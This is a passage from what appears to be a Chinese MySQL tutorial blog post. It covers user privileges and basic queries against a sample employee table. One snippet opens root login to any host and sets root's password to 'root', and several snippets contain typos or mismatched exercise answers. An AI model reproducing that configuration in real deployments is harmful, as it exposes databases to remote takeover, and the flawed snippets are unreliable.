class="hljs-string">&#x27;主机名&#x27;</span>;<span class="hljs-comment"># 查看 mz 用户的权限</span>show grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;use information_schema; <span class="hljs-comment"># 不需要权限</span>show tables;<span class="hljs-keyword">select</span> * from tables;<span class="hljs-comment"># 查看 root 的权限</span>show grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;</code></pre><ol><li>添加权限</li></ol><pre><code class="hljs bash">grant 权限列表 on 数据库名.表名 to <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<span class="hljs-comment">## 查询权限 select</span><span class="hljs-comment"># 将mz数据库的test表的查询权限给mz用户</span>grant <span class="hljs-keyword">select</span> on mz.test to <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<span class="hljs-comment"># 将mz数据库的所有表的查询权限给mz用户</span>grant <span class="hljs-keyword">select</span> on mz.* to <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<span class="hljs-comment">## create,drop,alter</span><span class="hljs-comment"># 给mz库下的创建、删除、修改表的权限给mz</span>grant create,drop,alter on mz.* to <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<span class="hljs-comment"># 给全部mz库下面的表权限给mz用户</span>grant all on mz.* to <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;</code></pre><ol><li>撤销权限</li></ol><pre><code class="hljs bash">revoke 权限列表 on 数据库名.表名 to <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<span class="hljs-comment"># 撤销 select 权限</span>revoke <span class="hljs-keyword">select</span> no mz.* from <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;</code></pre><h3 id="修改host登录"><a href="#修改host登录" class="headerlink" title="修改host登录"></a>修改host登录</h3><pre><code class="hljs bash"><span class="hljs-comment"># 修改Host是某IP登录</span>update user <span class="hljs-built_in">set</span> host=<span class="hljs-string">&#x27;ip&#x27;</span> <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span>;<span class="hljs-comment"># 运行任意IP连接</span>update user <span class="hljs-built_in">set</span> host=<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span>;<span class="hljs-comment"># h指定ip地址: mysql -u root -h ip -p </span><span class="hljs-comment"># 修改密码</span>alter user <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;ip&#x27;</span> identified with mysql_native_password by <span class="hljs-string">&#x27;root&#x27;</span><span class="hljs-comment"># 刷新配置</span>flush privileges;</code></pre><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><pre><code class="hljs bash"><span class="hljs-keyword">select</span> 字段列表from 表名列表<span class="hljs-built_in">where</span>条件列表group by 分组字段列表having分组后条件列表order by排序字段列表<span class="hljs-built_in">limit</span>分页参数<span class="hljs-comment"># 数据表准备</span>create table emp(<span class="hljs-built_in">id</span> int comment <span class="hljs-string">&#x27;编号&#x27;</span>,workno varchar(10) comment <span class="hljs-string">&#x27;工号&#x27;</span>,name varchar(10) comment <span class="hljs-string">&#x27;姓名&#x27;</span>,gender char(1) comment <span class="hljs-string">&#x27;性别&#x27;</span>,age tinyint unsigned comment <span class="hljs-string">&#x27;年龄&#x27;</span>,idcard char(18) comment <span class="hljs-string">&#x27;身份证号&#x27;</span>,workaddress varchar(50) comment <span class="hljs-string">&#x27;工作地址&#x27;</span>,entrydate <span class="hljs-built_in">date</span> comment <span class="hljs-string">&#x27;入职时间&#x27;</span>)comment <span class="hljs-string">&#x27;员工表&#x27;</span>;<span class="hljs-comment"># 数据准备</span>INSERT INTO emp VALUES (1, <span class="hljs-string">&#x27;00001&#x27;</span>, <span class="hljs-string">&#x27;柳岩666&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, 20, <span class="hljs-string">&#x27;123456789012345678&#x27;</span>, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2000-01-01&#x27;</span>),(2, <span class="hljs-string">&#x27;00002&#x27;</span>, <span class="hljs-string">&#x27;张无忌&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 18, <span class="hljs-string">&#x27;123456789012345670&#x27;</span>, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2005-09-01&#x27;</span>),(3, <span class="hljs-string">&#x27;00003&#x27;</span>, <span class="hljs-string">&#x27;韦一笑&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 38, <span class="hljs-string">&#x27;123456789712345670&#x27;</span>, <span class="hljs-string">&#x27;上海&#x27;</span>, <span class="hljs-string">&#x27;2005-08-01&#x27;</span>),(4, <span class="hljs-string">&#x27;00004&#x27;</span>, <span class="hljs-string">&#x27;赵敏&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, 18, <span class="hljs-string">&#x27;123456757123845670&#x27;</span>, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2009-12-01&#x27;</span>),(5, <span class="hljs-string">&#x27;00005&#x27;</span>, <span class="hljs-string">&#x27;小昭&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, 16, <span class="hljs-string">&#x27;123456769012345678&#x27;</span>, <span class="hljs-string">&#x27;上海&#x27;</span>, <span class="hljs-string">&#x27;2007-07-01&#x27;</span>),(6, <span class="hljs-string">&#x27;00006&#x27;</span>, <span class="hljs-string">&#x27;杨逍&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 28, <span class="hljs-string">&#x27;12345678931234567X&#x27;</span>, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2006-01-01&#x27;</span>),(7, <span class="hljs-string">&#x27;00007&#x27;</span>, <span class="hljs-string">&#x27;范瑶&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 40, <span class="hljs-string">&#x27;123456789212345670&#x27;</span>, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2005-05-01&#x27;</span>),(8, <span class="hljs-string">&#x27;00008&#x27;</span>, <span class="hljs-string">&#x27;黛绮丝&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, 38, <span class="hljs-string">&#x27;123456157123645670&#x27;</span>, <span class="hljs-string">&#x27;天津&#x27;</span>, <span class="hljs-string">&#x27;2015-05-01&#x27;</span>),(9, <span class="hljs-string">&#x27;00009&#x27;</span>, <span class="hljs-string">&#x27;范凉凉&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, 45, <span class="hljs-string">&#x27;123156789012345678&#x27;</span>, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2010-04-01&#x27;</span>),(10, <span class="hljs-string">&#x27;00010&#x27;</span>, <span class="hljs-string">&#x27;陈友谅&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 53, <span class="hljs-string">&#x27;123456789012345670&#x27;</span>, <span class="hljs-string">&#x27;上海&#x27;</span>, <span class="hljs-string">&#x27;2011-01-01&#x27;</span>),(11, <span class="hljs-string">&#x27;00011&#x27;</span>, <span class="hljs-string">&#x27;张士诚&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 55, <span class="hljs-string">&#x27;123567897123465670&#x27;</span>, <span class="hljs-string">&#x27;江苏&#x27;</span>, <span class="hljs-string">&#x27;2015-05-01&#x27;</span>),(12, <span class="hljs-string">&#x27;00012&#x27;</span>, <span class="hljs-string">&#x27;常遇春&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 32, <span class="hljs-string">&#x27;123446757152345670&#x27;</span>, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2004-02-01&#x27;</span>),(13, <span class="hljs-string">&#x27;00013&#x27;</span>, <span class="hljs-string">&#x27;张三丰&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 88, <span class="hljs-string">&#x27;123656789012345678&#x27;</span>, <span class="hljs-string">&#x27;江苏&#x27;</span>, <span class="hljs-string">&#x27;2020-11-01&#x27;</span>),(14, <span class="hljs-string">&#x27;00014&#x27;</span>, <span class="hljs-string">&#x27;灭绝&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, 65, <span class="hljs-string">&#x27;123456719012345670&#x27;</span>, <span class="hljs-string">&#x27;西安&#x27;</span>, <span class="hljs-string">&#x27;2019-05-01&#x27;</span>),(15, <span class="hljs-string">&#x27;00015&#x27;</span>, <span class="hljs-string">&#x27;胡青牛&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, 70, <span class="hljs-string">&#x27;12345674971234567X&#x27;</span>, <span class="hljs-string">&#x27;西安&#x27;</span>, <span class="hljs-string">&#x27;2018-04-01&#x27;</span>),(16, <span class="hljs-string">&#x27;00016&#x27;</span>, <span class="hljs-string">&#x27;周芷若&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, 18, null, <span class="hljs-string">&#x27;北京&#x27;</span>, <span class="hljs-string">&#x27;2012-06-01&#x27;</span>);</code></pre><h3 id="基础查询-select"><a href="#基础查询-select" class="headerlink" title="基础查询 select"></a>基础查询 select</h3><pre><code class="hljs bash"><span class="hljs-comment"># 全表查询</span><span class="hljs-keyword">select</span> * from emp;<span class="hljs-comment"># 查询某些字段</span><span class="hljs-keyword">select</span> name,gender from emp;<span class="hljs-comment"># 查询别名显示</span><span class="hljs-keyword">select</span> name as 姓名, gender as 性别 from emp;<span class="hljs-comment"># 去重查询</span><span class="hljs-keyword">select</span> distinct gender from emp;<span class="hljs-comment">## 练习</span><span class="hljs-comment"># A. 查询指定字段 name, workno, age 并返回</span><span class="hljs-keyword">select</span> name,workno,age from emp;<span class="hljs-comment"># B. 查询返回所有字段</span><span class="hljs-keyword">select</span> * from emp;<span class="hljs-comment"># C. 查询所有员工的工作地址,起别名</span><span class="hljs-keyword">select</span> workaddress as <span class="hljs-string">&#x27;工作地址&#x27;</span> from emp;<span class="hljs-comment"># D. 查询公司员工的上班地址有哪些(不要重复)</span><span class="hljs-keyword">select</span> distinct workaddress from emp;</code></pre><h3 id="聚合函数-count"><a href="#聚合函数-count" class="headerlink" title="聚合函数 count"></a>聚合函数 count</h3><p>将一列数据作为一个整体，进行纵向计算。</p><table><thead><tr><th align="left">聚合函数</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">count</td><td align="left">统计数量</td></tr><tr><td align="left">max</td><td align="left">最大值</td></tr><tr><td align="left">min</td><td align="left">最小值</td></tr><tr><td align="left">avg</td><td align="left">平均值</td></tr><tr><td align="left">sum</td><td align="left">求和</td></tr></tbody></table><pre><code class="hljs bash"><span class="hljs-comment">## 语法：select 聚合函数(字段列表) from 表名;</span><span class="hljs-keyword">select</span> count(*) from emp;<span class="hljs-comment"># 统计表有多少行，*可以用1代替</span><span class="hljs-keyword">select</span> count(*) as total from emp;<span class="hljs-comment"># 统计idcard非空行数量</span><span class="hljs-keyword">select</span> count(idcard) as total from emp;<span class="hljs-comment">## 统计员工年龄</span><span class="hljs-comment"># 平均年龄</span><span class="hljs-keyword">select</span> avg(age) from emp;<span class="hljs-comment"># 最大年龄</span><span class="hljs-keyword">select</span> max(age) from emp;<span class="hljs-comment"># 最小年龄</span><span class="hljs-keyword">select</span> min(age) from emp;<span class="hljs-comment"># 全部年龄</span><span class="hljs-keyword">select</span> <span class="hljs-built_in">sum</span>(age) from emp;<span class="hljs-comment"># 统计西安地区的平均年龄</span><span class="hljs-keyword">select</span> avg(age) from emp <span class="hljs-built_in">where</span> workaddress=<span class="hljs-string">&#x27;西安&#x27;</span>;</code></pre><h3 id="条件查询-where"><a href="#条件查询-where" class="headerlink" title="条件查询 where"></a>条件查询 where</h3><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&gt;</td><td align="left">大于</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于</td></tr><tr><td align="left">&lt;</td><td align="left">小于</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于</td></tr><tr><td align="left">&#x3D;</td><td align="left">等于</td></tr><tr><td align="left">&lt;&gt; 或者 !&#x3D;</td><td align="left">不等于</td></tr><tr><td align="left">between … and …</td><td align="left">在某个范围之内(含最小，最大值)</td></tr><tr><td align="left">in (…)</td><td align="left">在 in 之后的列表中的值，多旋一</td></tr><tr><td align="left">like 占位符</td><td align="left">模糊匹配 (_匹配单个字符，%匹配任意字符)</td></tr><tr><td align="left">is NULL</td><td align="left">是 NULL</td></tr></tbody></table><table><thead><tr><th align="left">逻辑运算符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">AND 或 &amp;&amp;</td><td align="left">并且（多个条件都成立）</td></tr><tr><td align="left">OR 或 ||</td><td align="left">或者（多个条件任意一个成立）</td></tr><tr><td align="left">NOT 或 ！</td><td align="left">非，不是</td></tr></tbody></table><pre><code class="hljs bash"><span class="hljs-comment">## 练习</span><span class="hljs-comment"># A. 查询年龄等于 88 的员工</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age=18;<span class="hljs-comment"># B. 查询年龄小于 20 的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age&lt;20;<span class="hljs-comment"># C. 查询年龄小于等于 20 的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age&lt;=20;<span class="hljs-comment"># D. 查询没有身份证号的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> idcard is null;<span class="hljs-comment"># E. 查询有身份证号的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> idcard is not null;<span class="hljs-comment"># F. 查询年龄不等于 88 的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age!=88;<span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age&lt;&gt;88;<span class="hljs-comment"># G. 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age &gt;= 15 and age &lt;=20;<span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age between 15 and 20;<span class="hljs-comment"># H. 查询性别为 女 且年龄小于 25岁的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> gender=<span class="hljs-string">&#x27;女&#x27;</span> and age&lt;25;<span class="hljs-comment"># I. 查询年龄等于18 或 20 或 40 的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age=18 or age=20 or age=40;<span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age <span class="hljs-keyword">in</span>(18,20,40);<span class="hljs-comment"># J. 查询姓名为两个字的员工信息 _ %</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> name like <span class="hljs-string">&#x27;__&#x27;</span>;<span class="hljs-comment"># K. 查询身份证号最后一位是X的员工信息</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> idcard like <span class="hljs-string">&#x27;_________________X&#x27;</span>;<span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> idcard list <span class="hljs-string">&#x27;%X&#x27;</span>;</code></pre><h3 id="分组查询-group-by"><a href="#分组查询-group-by" class="headerlink" title="分组查询 group by"></a>分组查询 group by</h3><pre><code class="hljs bash"><span class="hljs-comment"># where 是分组前过滤, having 是分组后的过滤条件</span><span class="hljs-comment"># 根据性别分组：统计男性和女性的数量</span><span class="hljs-keyword">select</span> gender,count(*) from emp group by gender;<span class="hljs-keyword">select</span> gender,count(*) total from emp group by gender;<span class="hljs-comment"># 根据性别分组：统计男性和女性的数量</span><span class="hljs-keyword">select</span> gender,avg(age) from emp group by gender;<span class="hljs-comment"># 查询年龄小于45的员工，并根据工作地址分组，获取员工数量大于等于3的工作地点。</span><span class="hljs-keyword">select</span> workaddress,count(*) total from emp <span class="hljs-built_in">where</span> age &lt; 45 group by workaddress having total &gt;= 3;<span class="hljs-comment"># 根据工作地址和性别统计人数</span><span class="hljs-keyword">select</span> workaddress,gender, count(*) <span class="hljs-string">&#x27;total&#x27;</span> from emp group by workaddress,gender;</code></pre><h3 id="排序查询-order-by-降序desc"><a href="#排序查询-order-by-降序desc" class="headerlink" title="排序查询 order by (降序desc)"></a>排序查询 order by (降序desc)</h3><pre><code class="hljs bash"><span class="hljs-comment"># 默认升序</span><span class="hljs-comment"># 按照年龄从小到大升序</span><span class="hljs-keyword">select</span> * from emp order by age;<span class="hljs-keyword">select</span> * from emp order by age asc;<span class="hljs-comment"># 按照年龄从大到小，降序</span><span class="hljs-keyword">select</span> * from emp order by age desc;<span class="hljs-comment"># 根据入职时间先降序，(同入职时间的)根据年龄升序</span><span class="hljs-keyword">select</span> * from emp order by entrydate desc, age asc;</code></pre><h3 id="分页查询-limit"><a href="#分页查询-limit" class="headerlink" title="分页查询 limit"></a>分页查询 limit</h3><pre><code class="hljs bash"><span class="hljs-comment"># 对查询结果进行分页</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">limit</span> 0,10;<span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">limit</span> 10,20;</code></pre><h3 id="联合查询-union"><a href="#联合查询-union" class="headerlink" title="联合查询 union"></a>联合查询 union</h3><pre><code class="hljs bash"><span class="hljs-comment"># 将多次查询结果联合在一起，形成一次查询结果</span><span class="hljs-comment"># 多表查询必须列数一样</span><span class="hljs-comment"># 会自动去重，不想去重可以使用 union all</span><span class="hljs-comment"># 查询ID小于10和age=88</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> &lt; 10union<span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age = 88;<span class="hljs-comment"># 查询ID小于10和age=88，不去重</span><span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> &lt; 10union all<span class="hljs-keyword">select</span> * from emp <span class="hljs-built_in">where</span> age = 88;</code></pre><h1 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h1><h2 id="MySQL-触发器"><a href="#MySQL-触发器" class="headerlink" title="MySQL 触发器"></a>MySQL 触发器</h2><h2 id="MySQL-数据库引擎"><a href="#MySQL-数据库引擎" class="headerlink" title="MySQL 数据库引擎"></a>MySQL 数据库引擎</h2><h2 id="MySQL-事务"><a href="#MySQL-事务" class="headerlink" title="MySQL 事务"></a>MySQL 事务</h2><h2 id="MySQL-分区分表"><a href="#MySQL-分区分表" class="headerlink" title="MySQL 分区分表"></a>MySQL 分区分表</h2><h2 id="MySQL-视图"><a href="#MySQL-视图" class="headerlink" title="MySQL 视图"></a>MySQL 视图</h2><h2 id="MySQL-数据库设计及SQL优化"><a href="#MySQL-数据库设计及SQL优化" class="headerlink" title="MySQL 数据库设计及SQL优化"></a>MySQL 数据库设计及SQL优化</h2><h2 id="MySQL-数据备份还原"><a href="#MySQL-数据备份还原" class="headerlink" title="MySQL 数据备份还原"></a>MySQL 数据备份还原</h2><h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><hr>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
